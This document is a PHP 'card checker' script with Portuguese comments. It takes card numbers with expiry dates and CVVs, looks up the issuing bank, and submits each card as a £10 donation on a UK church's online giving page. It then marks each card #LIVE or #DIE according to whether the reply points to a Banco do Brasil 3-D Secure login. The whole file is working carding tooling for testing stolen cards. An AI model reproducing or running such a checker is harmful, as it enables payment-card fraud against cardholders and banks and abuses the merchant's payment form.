<?php
error_reporting(0);

// ''''''''''''''''''''''''''''''''''''''''''''' FUNÇAO DE CAPTURA ''''''''''''''''''''''''''''''''''''''''''''''''''''''
     function dados($string,$start,$end){
     $str = explode($start, $string);
     $str = explode($end, $str[1]);
     return $str[0];}


// ''''''''''''''''''''''''''''''''''''''''''''' INJEÇAO DE LISTA ''''''''''''''''''''''''''''''''''''''''''''''''''''''
    extract($_GET);
    $lista = str_replace(" " , "", $lista);
    $separar = explode("|", $lista);
    $cc = $separar[0];
    $mes = $separar[1];
    $ano = $separar[2];
    $cvv = $separar[3]; 
    $bin = substr($cc, 0,6);
// ''''''''''''''''''''''''''''''''''''''''''''' GET/ CHECKER BIN ''''''''''''''''''''''''''''''''''''''''''''''''''''''

    $mg = curl_init();
    curl_setopt_array($mg, array(
    CURLOPT_URL => 'https://binlist.io/lookup/'.$bin.'/',
    CURLOPT_RETURNTRANSFER =>1,
    CURLOPT_FOLLOWLOCATION =>1,
    CURLOPT_COOKIEFILE => getcwd().'/bin.txt',
    CURLOPT_COOKIEJAR => getcwd().'/bin.txt', ));
    $lef = curl_exec($mg);
// ''''''''''''''''''''''''''''''''''''''''''''' CAPTURA DE INFO DA BIN ''''''''''''''''''''''''''''''''''''''''''''''''''''''              
    $bandeira = dados($lef,'"scheme": "','"');
    $tipo = dados($lef,'"type": "','"');
    $card = dados($lef,'"category": "','"');
    $pais = dados($lef,'"name": "','"');
    $banco = dados($lef,'"bank": {"name": "','"');
// ''''''''''''''''''''''''''''''''''''''''''''' CHECKER BB ''''''''''''''''''''''''''''''''''''''''''''''''''''''  
    $mg = curl_init();
    curl_setopt_array($mg, array(
    CURLOPT_URL => 'https://jesushouse.myiknowchurch.co.uk/giving/pay',
    CURLOPT_RETURNTRANSFER =>1,
    CURLOPT_PROXY =>"",
    CURLOPT_PROXYUSERPWD =>"",
    CURLOPT_FOLLOWLOCATION =>1,
    CURLOPT_COOKIEFILE => getcwd().'/bin.txt',
    CURLOPT_COOKIEJAR => getcwd().'/bin.txt',
    CURLOPT_POSTFIELDS =>'card_fname=TOLLEN&card_sname=VIJARIO&card_number='.$cc.'&card_start_m=&card_start_y=&card_expiry_m='.$mes.'&card_expiry_y='.$ano.'&card_cvv='.$cvv.'&card_line1=RUA+MACATUBA%2C+500&card_line2=&card_line3=&card_city=MANAUS&card_county=AM&card_postcode=69099-266&system_id=1&desc=iKnow+Web+Giving&amount=10.00&invoice=IK-GV01-00000263'));
    $lef = curl_exec($mg);
             

if (strpos($lef, "https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb") !== false) {
echo "<span class='badge badge-success'>#LIVE</span> $cc|$mes|$ano|$cvv | $bandeira | $tipo | $card | $banco ($pais) |  VBV/MSC  | <span class='badge badge-success'>@BRASILINHACHKGGBB</span><br>";
}

elseif (strpos($lef, "auth.bb") !== false) {
echo "<span class='badge badge-success'>#LIVE</span> $cc|$mes|$ano|$cvv | $bandeira | $tipo | $card | $banco ($pais) |  VBV/MSC  | <span class='badge badge-success'>@BRASILINHACHKGGBB</span><br>";

}

else{echo "<br><span class='badge badge-danger'>#DIE</span> $cc|$mes|$ano|$cvv | <span class='badge badge-success'>@BRASILINHACHKGGBB</span</br>";}

curl_close($ch);
ob_flush();

if(file_exists(getcwd().'/bin.txt')){
unlink(getcwd().'/bin.txt');}
?>